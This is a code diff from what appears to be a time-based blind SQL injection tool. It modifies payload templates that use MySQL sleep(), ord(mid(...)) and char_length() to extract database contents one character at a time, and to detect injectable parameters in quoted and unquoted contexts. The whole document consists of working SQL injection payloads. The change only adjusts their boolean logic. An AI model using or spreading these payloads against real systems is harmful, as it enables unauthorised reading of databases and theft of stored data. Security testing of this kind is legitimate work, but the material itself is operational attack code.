@@ -19,18 +19,18 @@ MAX_ROW_LENGTH = 128    # Max number of characters of a row.
 
 _bool_injections = {    # Injections to detect a character or the length of a row.
     "unquoted": {
-        "char": "1 and if(ord(mid((select %s from %s limit %s,1), %s,1))%s, sleep(%s), sleep(0))",
-        "len": "1 and if(char_length((select %s from %s limit %s,1))=%s, sleep(%s), sleep(0))"
+        "char": "1 and 0 or if(ord(mid((select %s from %s limit %s,1), %s,1))%s, sleep(%s), sleep(0))",
+        "len": "1 and 0 or if(char_length((select %s from %s limit %s,1))=%s, sleep(%s), sleep(0))"
     },
     "quoted": {
-        "char": "1' or if(ord(mid((select %s from %s limit %s,1), %s,1))%s, sleep(%s), sleep(0)) -- -",
-        "len": "1' or if(char_length((select %s from %s limit %s,1))=%s, sleep(%s), sleep(0)) -- -"
+        "char": "1' and 0 or if(ord(mid((select %s from %s limit %s,1), %s,1))%s, sleep(%s), sleep(0)) -- -",
+        "len": "1' and 0 or if(char_length((select %s from %s limit %s,1))=%s, sleep(%s), sleep(0)) -- -"
     }
 }
 
 _sleep_injections = {   # Injections to detect vulnerable parameters.
-    "unquoted": "1 and sleep(%s)",
-    "quoted": "1' or sleep(%s) -- -"
+    "unquoted": "1 and 0 or sleep(%s)",
+    "quoted": "1' or 0 or sleep(%s) -- -"
 }
 
 
